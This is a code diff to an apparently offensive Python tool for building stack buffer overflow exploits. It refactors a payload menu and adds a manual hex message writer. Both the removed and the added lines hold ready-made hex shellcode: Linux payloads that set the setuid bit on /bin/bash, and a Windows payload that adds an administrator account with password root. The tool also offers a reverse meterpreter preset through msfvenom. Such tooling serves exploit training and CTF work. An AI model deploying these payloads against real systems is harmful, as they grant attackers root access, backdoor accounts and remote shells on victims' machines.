@@ -106,7 +106,8 @@ class exploit:
         default = f"{os.getcwd()}/stacksmash"
         path = get_filepath(
             "where you'd like to save your settings", default=default)
-        self.payload_generator(buffer_size=self.buffer_size,target_eip=self.target_eip[0])
+        self.payload_generator(buffer_size=self.buffer_size,
+                               target_eip=self.target_eip[0])
         with open(path, "w") as file:
             file.write(str(self))
         clear_screen()
@@ -260,113 +261,7 @@ class exploit:
         """
         Gets input from user and sets exploit shellcode accordingly
         """
-        while True:
-            response = get_input("\n#|| How would you like to generate your payload?\n" +
-                                 "\n[1] -- Use one of the built-in payloads\n2 -- Specify a msfvenom command" +
-                                 " (can be done without leaving tool)\n3 -- Copy/Paste your shellcode into " +
-                                 "the tool as a string\n", ["1", "2", "3", ""], default="1")
-            if response == "1":
-                # format:
-                # description: (payload, args, bad_chars)
-                available = {
-                    "linux x86: chmod u+s /bin/bash -- no specified bad chars " + \
-                    "(prebuilt, no msfvenom required)":
-                    ("Preset", "Preset", "Preset"),
-                    "linux x86: chmod u+s /bin/bash -- " + r"-b \x00\x0a\x0d" + \
-                    "(prebuilt, no msfvenom required)":
-                    ("Preset", "Preset", "Preset"),
-                    "linux x64: chmod u+s /bin/bash -- " + r"-b \x00\x0a\x0d" + \
-                    "(prebuilt, no msfvenom required)":
-                    ("Preset", "Preset", "Preset"),
-                    "windows: add Administrator account (u:root/p:root) (prebuilt, no " +
-                    "msfvenom required)": ("Preset", "Preset", "Preset"),
-                    "linux: chmod u+s /bin/bash": ("linux/x86/exec", "CMD=\"chmod u+s " +
-                                                   "/bin/bash\"", "\\x00\\x0a\\x0d"),
-                    "windows: reverse meterpreter": ("windows/meterpreter/reverse_tcp",
-                                                     "LHOST=[] LPORT=[]", "\\x00\\x0a\\x0d")
-                }
-                print("\nThe following preset payloads are available:")
-                keys = list(available.keys())
-                values = list(available.values())
-                for i in range(len(keys)):
-                    print(f"{i} : {keys[i]}")
-                options = [str(i) for i in range(len(keys))]
-                options.append("b")
-                response = get_input("\nEnter your selection: (0,1,...,n):\nOr, enter \"b\" to go back\n",
-                                     options)
-                if response == "b":
-                    continue
-                elif response == "0":
-                    self.shellcode = \
-                        "6a0b58995266682d6389e7682f736800682f62696e89e352e81400000063686d6f6420752b73202f6" + \
-                        "2696e2f6261736800575389e1cd80"
-                    break
-                elif response == "1":
-                    self.shellcode = \
-                        "dbc3bdce613c86d97424f45f2bc9b10e83c704316f16036f16e23b0b37de5a9e21b6717c27a1e1ad4" + \
-                        "446f1d985f49877531b086077dcac701bb4c11fbf646ccb4c45a169daeb920f7d8784cf2a34dd3119" + \
-                        "3a"
-                    break
-                elif response == "2":
-                    self.shellcode = \
-                        "4831c94881e9f8ffffff488d05efffffff48bb07c07ca0764837e248315827482df8ffffffe2f46df" + \
-                        "b24393ef318806eae53d31e4864aa8e27148d154837aa8e262e48624837e264a811cf126842c974e0" + \
-                        "53c21f26188066b314a0201f7f6be1cf79a0764837e2"
-                    break
-                elif response == "3":
-                    self.shellcode = \
-                        "ba19a5b4d8d9cbd97424f45f2bc9b14783effc31570f035716474124c005aad5106a223021aa5030" + \
-                        "111a12149dd1768d16975ea29f12b98d200ef98ca24d2e6f9b9d236edcc0ce22b58f7dd3b2da" + \
-                        "bd5888cbc5bd58ede413d3b4269530cd6e8d55e83926ad86bbeefc6717cf319a6917f5451c6106" + \
-                        "fb27b67527ad2dddac158adc61c359d2ce8706f6d1443d02596b9283194836c8faf16fb4ad0e6f" + \
-                        "1711abfbb546c6a1d39954dc919a66df85f257544a8467bf2f7a22e21913eb76187e0cad5e878f" + \
-                        "441e7c8f2c1b3817dc5151f2e2c652d79387dbbd21244c5baaa6a2c64a539b46eecffb03a3aaa9" + \
-                        "8b315b21b895d1d22fa23502d12e517c3ed6b9532550c9c2d7c55a2f7663ea2af4505cf0ac862c" + \
-                        "b50f86e00ec247adc0c216298c6bf7d83d18757bb68f0b081622838122e2743caf868a"
-                    break
-                else:
-                    i = int(response)
-                    payload = values[i][0]
-                    args = values[i][1]
-                    bad_chars = values[i][2]
-                    while True:
-                        print(f"\nPayload: {payload}\n" +
-                              f"\nArguments: {args}" +
-                              f"\nBad Characters: {bad_chars}\n")
-                        response = get_input("Would you like to edit one or more of the variables? (p/a/b/[n](no))",
-                                             ["p", "a", "b", "n", ""], default="n")
-                        if response == "n":
-                            break
-                        elif response == "p":
-                            payload = input("\nEnter the new value:\n").strip()
-                        elif response == "a":
-                            args = input("\nEnter the new value:\n").strip()
-                        elif response == "b":
-                            bad_chars = input(
-                                "\nEnter the new value:\n").strip()
-                    self.shellcode = get_venom(payload, args, bad_chars)
-                    break
-            elif response == "2":
-                while True:
-                    payload = input("\nWhat msfvenom payload do you want to use?\n\t" +
-                                    "Note:Error-checking is limited here, enter input carefully\n").strip()
-                    args = input(
-                        "\nEnter any payload arguments: (e.g. LHOST=8.8.8.8 LPORT=4444)\n").strip()
-                    bad_chars = input(
-                        "\nEnter any bad characters: (e.g. " + r"\x00\x0a\x0d" + ")\n").strip()
-                    if check_input():
-                        break
-                self.shellcode = get_venom(payload, args, bad_chars)
-                break
-            else:
-                while True:
-                    payload = input(
-                        "\nPaste your shellcode as a single line. Omit any quotes.\n")
-                    if check_input():
-                        break
-                self.shellcode = payload.replace("\\x", "")
-                break
-            response = None
+        self.shellcode = get_shellcode()
 
     def get_info(self):
         """
@@ -602,7 +497,7 @@ class exploit:
                          ["y", "n", ""], default="n")
         if yn_key[show]:
             for line in responses:
-                print("\t",line,sep="")
+                print("\t", line, sep="")
         input("\nFinished. Press ENTER to return.")
 
 
@@ -674,6 +569,119 @@ def interpret_dmesg(exp, dmesg, successful_pattern):
         f"[*] Identified buffer size as {exp.buffer_size} and target EIP(s) as {exp.target_eip}")
 
 
+def get_shellcode():
+    """
+    Description:
+        interactive menu. returns shellcode.
+    Args:
+        None
+    Returns:
+        shellcode - str - exactly what it sounds like
+    """
+    while True:
+        response = get_input("\n#|| How would you like to generate your payload?\n" +
+                             "\n[1] -- Use one of the built-in payloads\n2 -- Specify a msfvenom command" +
+                             " (can be done without leaving tool)\n3 -- Copy/Paste your shellcode into " +
+                             "the tool as a string\n", ["1", "2", "3", ""], default="1")
+        if response == "1":
+            # format:
+            # description: (payload, args, bad_chars)
+            available = {
+                "linux x86: chmod u+s /bin/bash -- no specified bad chars " +
+                "(prebuilt, no msfvenom required)":
+                ("Preset", "Preset", "Preset"),
+                "linux x86: chmod u+s /bin/bash -- " + r"-b \x00\x0a\x0d" +
+                "(prebuilt, no msfvenom required)":
+                ("Preset", "Preset", "Preset"),
+                "linux x64: chmod u+s /bin/bash -- " + r"-b \x00\x0a\x0d" +
+                "(prebuilt, no msfvenom required)":
+                ("Preset", "Preset", "Preset"),
+                "windows: add Administrator account (u:root/p:root) (prebuilt, no " +
+                "msfvenom required)": ("Preset", "Preset", "Preset"),
+                "linux: chmod u+s /bin/bash": ("linux/x86/exec", "CMD=\"chmod u+s " +
+                                               "/bin/bash\"", "\\x00\\x0a\\x0d"),
+                "windows: reverse meterpreter": ("windows/meterpreter/reverse_tcp",
+                                                 "LHOST=[] LPORT=[]", "\\x00\\x0a\\x0d")
+            }
+            print("\nThe following preset payloads are available:")
+            keys = list(available.keys())
+            values = list(available.values())
+            for i in range(len(keys)):
+                print(f"{i} : {keys[i]}")
+            options = [str(i) for i in range(len(keys))]
+            options.append("b")
+            response = get_input("\nEnter your selection: (0,1,...,n):\nOr, enter \"b\" to go back\n",
+                                 options)
+            if response == "b":
+                continue
+            elif response == "0":
+                shellcode = \
+                    "6a0b58995266682d6389e7682f736800682f62696e89e352e81400000063686d6f6420752b73202f6" + \
+                    "2696e2f6261736800575389e1cd80"
+            elif response == "1":
+                shellcode = \
+                    "dbc3bdce613c86d97424f45f2bc9b10e83c704316f16036f16e23b0b37de5a9e21b6717c27a1e1ad4" + \
+                    "446f1d985f49877531b086077dcac701bb4c11fbf646ccb4c45a169daeb920f7d8784cf2a34dd3119" + \
+                    "3a"
+            elif response == "2":
+                shellcode = \
+                    "4831c94881e9f8ffffff488d05efffffff48bb07c07ca0764837e248315827482df8ffffffe2f46df" + \
+                    "b24393ef318806eae53d31e4864aa8e27148d154837aa8e262e48624837e264a811cf126842c974e0" + \
+                    "53c21f26188066b314a0201f7f6be1cf79a0764837e2"
+            elif response == "3":
+                shellcode = \
+                    "ba19a5b4d8d9cbd97424f45f2bc9b14783effc31570f035716474124c005aad5106a223021aa5030" + \
+                    "111a12149dd1768d16975ea29f12b98d200ef98ca24d2e6f9b9d236edcc0ce22b58f7dd3b2da" + \
+                    "bd5888cbc5bd58ede413d3b4269530cd6e8d55e83926ad86bbeefc6717cf319a6917f5451c6106" + \
+                    "fb27b67527ad2dddac158adc61c359d2ce8706f6d1443d02596b9283194836c8faf16fb4ad0e6f" + \
+                    "1711abfbb546c6a1d39954dc919a66df85f257544a8467bf2f7a22e21913eb76187e0cad5e878f" + \
+                    "441e7c8f2c1b3817dc5151f2e2c652d79387dbbd21244c5baaa6a2c64a539b46eecffb03a3aaa9" + \
+                    "8b315b21b895d1d22fa23502d12e517c3ed6b9532550c9c2d7c55a2f7663ea2af4505cf0ac862c" + \
+                    "b50f86e00ec247adc0c216298c6bf7d83d18757bb68f0b081622838122e2743caf868a"
+            else:
+                i = int(response)
+                payload = values[i][0]
+                args = values[i][1]
+                bad_chars = values[i][2]
+                while True:
+                    print(f"\nPayload: {payload}\n" +
+                          f"\nArguments: {args}" +
+                          f"\nBad Characters: {bad_chars}\n")
+                    response = get_input("Would you like to edit one or more of the variables? (p/a/b/[n](no))",
+                                         ["p", "a", "b", "n", ""], default="n")
+                    if response == "n":
+                        break
+                    elif response == "p":
+                        payload = input("\nEnter the new value:\n").strip()
+                    elif response == "a":
+                        args = input("\nEnter the new value:\n").strip()
+                    elif response == "b":
+                        bad_chars = input(
+                            "\nEnter the new value:\n").strip()
+                shellcode = get_venom(payload, args, bad_chars)
+        elif response == "2":
+            while True:
+                payload = input("\nWhat msfvenom payload do you want to use?\n\t" +
+                                "Note:Error-checking is limited here, enter input carefully\n").strip()
+                args = input(
+                    "\nEnter any payload arguments: (e.g. LHOST=8.8.8.8 LPORT=4444)\n").strip()
+                bad_chars = input(
+                    "\nEnter any bad characters: (e.g. " + r"\x00\x0a\x0d" + ")\n").strip()
+                if check_input():
+                    break
+            shellcode = get_venom(payload, args, bad_chars)
+        else:
+            while True:
+                payload = input(
+                    "\nPaste your shellcode as a single line. Omit any quotes.\n")
+                if check_input():
+                    break
+            shellcode = payload.replace("\\x", "")
+        response = None
+        if shellcode:
+            return shellcode
+
+
 def get_venom(payload, args, bad_chars):
     cmd_string = "msfvenom -p " + payload
     if len(args) > 1:
@@ -693,8 +701,8 @@ def get_venom(payload, args, bad_chars):
     lines = [line for line in output.split("\n") if "buf +=" in line]
     out = []
     for line in lines:
-        if re.search(r"[\'|\"].+[\'|\"]",line):
-            out.append(re.search(r"[\'|\"].+[\'|\"]",line)[0][1:-1])
+        if re.search(r"[\'|\"].+[\'|\"]", line):
+            out.append(re.search(r"[\'|\"].+[\'|\"]", line)[0][1:-1])
     venom = "".join(out)
     venom = venom.replace("\\x", "")
     return venom
@@ -744,9 +752,58 @@ def change_setting(exp):
         exp.__setattr__(keylist[choice], translate_type(user_inpt))
 
 
+def manual_mode():
+    """
+    Description:
+        Allows user to easily write a hex message. Saves to a file.
+    Args:
+        None
+    Returns:
+        None
+    """
+    clear_screen()
+    msg = ''
+    while True:
+        print(f"Message so far:\n\n\t{msg}\n\n" +
+              "Enter the next piece of your message, or type 'save'/'quit'/'shellcode':\n\n" +
+              "(shellcode option allows you to use stack_smasher's built-in shellcodes and/or" +
+              " stack_smasher's msfvenom integration)\n" +
+              "(Note: shellcode will not show '\\x' between bytes. This is normal and okay.\n\n" +
+              r"Format: '\\x41,5' => '\\x41\\x41\\x41\\x41\\x41'" + "\n" +
+              r"Format: '\\x41\\x41' => '\\x41\\x41'" +
+              "\n\nComma plus integer specifies repetitions. Not required. Default is one.\n")
+        user_input = input('').strip()
+        if user_input == 'save':
+            default = f"{os.getcwd()}/msg"
+            path = get_filepath(
+                "where you'd like to save your message", default=default)
+            with open(path, "wb") as file:
+                file.write(bytearray.fromhex(msg.replace("\\x", "")))
+            clear_screen()
+            print("Saved the following message:\n\n", msg, sep="")
+            input("\n\nPress ENTER to continue")
+        elif user_input == 'quit':
+            return
+        elif user_input == 'shellcode':
+            msg += get_shellcode()
+        else:
+            args = [string.strip() for string in user_input.split(",")]
+            if len(args) > 1:
+                for _ in range(int(args[1])):
+                    msg += args[0]
+            else:
+                msg += args[0]
+        clear_screen()
+
+
 def exploit_handler(exp):
     """
-    Meta-method to guide the entire process of exploit development and running
+    Description:
+        Meta-method to guide the entire process of exploit development and running
+    Args:
+        exp - exploit - the exploit to be handled
+    Returns:
+        None
     """
     exp.get_info()
     header = "Welcome to the Exploit Menu"
@@ -786,13 +843,13 @@ def main_menu(choice=None, filename=None):
                 "#|| {} -- LOAD : Load Saved Exploit from File",
                 "#|| {} -- SELECT : Select one of the currently loaded exploits and " +
                 "enter the exploit menu",
+                "#|| {} -- MANUAL : Manual Message Writer mode",
                 "#|| {} -- EXIT"
             ]
             choice = get_menu_choice("Main Menu", options, default="1")
 
         if choice == 0:
-            # parser.print_help()
-            ud()
+            parser.print_help()
         elif choice == 1:
             print("Beginning New Exploit...")
             exploits.append(exploit())
@@ -812,6 +869,8 @@ def main_menu(choice=None, filename=None):
             else:
                 exploit_handler(exploits[choice])
         elif choice == 4:
+            manual_mode()
+        elif choice == 5:
             print("#|| Goodbye!")
             break
         choice = None
@@ -972,6 +1031,17 @@ def print_block(text, width, line, pad):
 
 
 def get_menu_choice(header, options, default=None):
+    '''
+    Description:
+        Given the menu/options text and an optional default value, gets,
+        sanitizes, and returns user's choice
+    Args:
+        header - str - menu text
+        options - list of strings - menu options
+        default - the default choice
+    Returns:
+        user's choice as int
+    '''
     print_block(header, pagewidth, border_line, 8)
     print("\n")
     [print(options[i].format(i)) for i in range(len(options))]
@@ -1020,6 +1090,8 @@ if __name__ == "__main__":
                         help="open script in interactive mode", action="store_true")
     parser.add_argument("-l", "--load",
                         help="load: specify a file from which to load an exploit")
+    parser.add_argument("-m", "--manual",
+                        help="jump to manual message writer mode", action="store_true")
     args = parser.parse_args()
 
     if args.interactive:
@@ -1036,5 +1108,7 @@ if __name__ == "__main__":
         main_menu()
     elif args.load:
         main_menu(choice=2, filename=args.load)
+    elif args.manual:
+        main_menu(choice=4)
     else:
         parser.print_help()
